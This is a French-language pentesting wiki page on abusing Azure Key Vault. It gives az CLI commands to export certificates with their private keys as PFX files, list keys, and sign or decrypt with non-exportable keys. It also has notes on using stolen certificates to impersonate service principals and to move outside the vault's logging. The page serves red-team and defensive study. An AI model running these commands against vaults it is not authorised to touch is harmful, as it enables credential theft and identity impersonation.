---
title: "Clés et certificats : extraire et utiliser les clés Key Vault"
order: 2
description: "Extraire ou utiliser les clés et certificats Key Vault pour le déchiffrement, la signature et l'usurpation d'identité."
keywords:
  - Key Vault
  - clés
  - certificats
  - signature
  - déchiffrement
---

# Clés et certificats

Au-delà des secrets, un coffre contient des **clés** cryptographiques (pour la signature et le déchiffrement) et des **certificats** (souvent avec la clé privée). Un certificat stocké dans Key Vault est aussi exposé sous forme de secret, de sorte qu'un `get` sur le secret qui l'adosse retourne le PFX complet, clé privée comprise, ce qui constitue une voie immédiate vers l'usurpation de ce que le certificat authentifie.

## Télécharger un certificat avec sa clé privée

```bash
# the certificate's private material is the secret of the same name
az keyvault secret show --vault-name <vault> --name <cert> --query value -o tsv | base64 -d > cert.pfx
az keyvault certificate list --vault-name <vault> --query '[].id' -o tsv
```

Un PFX pour un certificat d'application ou de service principal vous permet de vous authentifier en tant que ce principal (par exemple `az login --service-principal --certificate`).

## Utiliser les clés sans les extraire

Les clés non exportables effectuent tout de même des opérations côté serveur pour quiconque détient `sign`/`decrypt`/`unwrapKey` :

```bash
az keyvault key list --vault-name <vault> --query '[].kid' -o tsv
# sign or decrypt as the key without ever seeing it
az keyvault key sign --vault-name <vault> --name <key> --algorithm RS256 --value <base64-digest>
az keyvault key decrypt --vault-name <vault> --name <key> --algorithm RSA-OAEP --value <base64-ct>
```

## Notes d'exploitation

- Un certificat qui adosse une connexion de service principal ou d'application est le butin : le PFX est un identifiant durable qui survit jusqu'à la rotation du certificat.
- `decrypt`/`unwrapKey` sur une clé de chiffrement de données peut déverrouiller des contenus de stockage ou de base de données chiffrés avec des clés gérées par le client.
- Les opérations sont journalisées sur le coffre, mais détenir le PFX extrait déplace entièrement l'attaquant hors du coffre.

## Outils

- **az cli** (`keyvault key`, `keyvault certificate`).
- **MicroBurst** (`Get-AzPasswords -ExportCerts`) : exporter les certificats avec leur clé privée.

## Références

- [Microsoft : clés Key Vault](https://learn.microsoft.com/azure/key-vault/keys/about-keys)
- [HackTricks Cloud : Azure Key Vault](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [NetSPI : MicroBurst](https://github.com/NetSPI/MicroBurst)
